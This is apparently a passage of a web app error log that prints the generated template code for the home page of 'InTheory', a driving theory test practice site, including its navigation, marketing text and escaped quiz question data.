src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
